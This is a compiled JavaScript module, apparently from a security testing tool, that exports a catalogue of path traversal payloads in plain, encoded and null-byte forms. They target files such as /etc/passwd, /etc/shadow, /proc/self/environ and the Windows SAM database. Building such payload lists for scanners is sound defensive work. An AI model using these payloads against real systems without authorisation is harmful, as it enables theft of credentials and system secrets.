"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.PATH_TRAVERSAL_PAYLOADS = void 0;
exports.getPathTraversalPayloads = getPathTraversalPayloads;
exports.getPathTraversalPayloadsByEncoding = getPathTraversalPayloadsByEncoding;
exports.PATH_TRAVERSAL_PAYLOADS = [
    {
        payload: "../../../etc/passwd",
        description: "Basic directory traversal (Linux)",
        severity: 'critical',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "....//....//....//etc/passwd",
        description: "Double-slash path traversal",
        severity: 'high',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "..%2F..%2F..%2Fetc%2Fpasswd",
        description: "URL-encoded path traversal",
        severity: 'high',
        os: 'linux',
        encoding: 'url',
    },
    {
        payload: "..%252F..%252F..%252Fetc%252Fpasswd",
        description: "Double URL-encoded path traversal",
        severity: 'high',
        os: 'linux',
        encoding: 'double-url',
    },
    {
        payload: "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        description: "Unicode-encoded path traversal",
        severity: 'high',
        os: 'linux',
        encoding: 'unicode',
    },
    {
        payload: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        description: "Basic directory traversal (Windows)",
        severity: 'critical',
        os: 'windows',
        encoding: 'none',
    },
    {
        payload: "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
        description: "URL-encoded Windows path traversal",
        severity: 'high',
        os: 'windows',
        encoding: 'url',
    },
    {
        payload: "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
        description: "Double URL-encoded Windows path traversal",
        severity: 'high',
        os: 'windows',
        encoding: 'double-url',
    },
    {
        payload: "/etc/passwd",
        description: "Absolute path (Linux)",
        severity: 'critical',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "C:\\Windows\\System32\\drivers\\etc\\hosts",
        description: "Absolute path (Windows)",
        severity: 'critical',
        os: 'windows',
        encoding: 'none',
    },
    {
        payload: "../../../etc/passwd%00",
        description: "Path traversal with null byte",
        severity: 'high',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "../../../etc/passwd\0",
        description: "Path traversal with null character",
        severity: 'high',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "../../../etc/passwd%00.txt",
        description: "Path traversal with encoded null byte",
        severity: 'high',
        os: 'linux',
        encoding: 'url',
    },
    {
        payload: "..%2F..%2F..%2Fetc%2Fpasswd%00",
        description: "URL-encoded with null byte",
        severity: 'high',
        os: 'linux',
        encoding: 'url',
    },
    {
        payload: "..//..//..//etc//passwd",
        description: "Double forward slash",
        severity: 'medium',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        description: "Double backslash (Windows)",
        severity: 'medium',
        os: 'windows',
        encoding: 'none',
    },
    {
        payload: "....//....//....//etc//passwd",
        description: "Mixed dots and slashes",
        severity: 'high',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "..%2F..%2F..%2Fetc%2Fpasswd",
        description: "URL-encoded bypass",
        severity: 'high',
        os: 'linux',
        encoding: 'url',
    },
    {
        payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        description: "Fully URL-encoded",
        severity: 'high',
        os: 'linux',
        encoding: 'url',
    },
    {
        payload: "../../../etc/shadow",
        description: "Read shadow file",
        severity: 'critical',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "../../../etc/hosts",
        description: "Read hosts file",
        severity: 'medium',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "../../../proc/self/environ",
        description: "Read process environment",
        severity: 'high',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "../../../proc/version",
        description: "Read kernel version",
        severity: 'low',
        os: 'linux',
        encoding: 'none',
    },
    {
        payload: "..\\..\\..\\windows\\win.ini",
        description: "Read win.ini",
        severity: 'medium',
        os: 'windows',
        encoding: 'none',
    },
    {
        payload: "..\\..\\..\\windows\\system32\\config\\sam",
        description: "Read SAM file",
        severity: 'critical',
        os: 'windows',
        encoding: 'none',
    },
    {
        payload: "..\\..\\..\\boot.ini",
        description: "Read boot.ini",
        severity: 'low',
        os: 'windows',
        encoding: 'none',
    },
];
function getPathTraversalPayloads(os) {
    if (!os) {
        return exports.PATH_TRAVERSAL_PAYLOADS;
    }
    return exports.PATH_TRAVERSAL_PAYLOADS.filter(p => !p.os || p.os.toLowerCase() === os.toLowerCase());
}
function getPathTraversalPayloadsByEncoding(encoding) {
    if (!encoding) {
        return exports.PATH_TRAVERSAL_PAYLOADS;
    }
    return exports.PATH_TRAVERSAL_PAYLOADS.filter(p => p.encoding === encoding);
}
//# sourceMappingURL=path-traversal.js.map